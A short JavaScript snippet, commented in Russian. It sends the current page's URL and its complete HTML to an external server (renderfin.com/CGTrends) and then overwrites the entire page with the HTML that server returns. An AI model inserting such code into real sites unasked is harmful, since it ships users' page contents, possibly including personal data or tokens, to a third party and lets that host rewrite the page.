// Здесь указываем URL сервера, на который будет отправлен HTML
const serverUrl = 'https://renderfin.com';
const pageUrl = window.location.href;

// Формируем тело запроса, добавляя URL страницы перед HTML кодом страницы
const requestBody = pageUrl + '<!--URL-->' + document.documentElement.outerHTML;

fetch(`${serverUrl}/CGTrends`, {
    method: 'POST',
    headers: {
        'Content-Type': 'text/html',
    },
    body: requestBody,
})
.then(response => response.text())
.then(html => {
    // Заменяем весь HTML документа на полученный ответ
    document.documentElement.innerHTML = html;
})
.catch(error => console.error('Error:', error));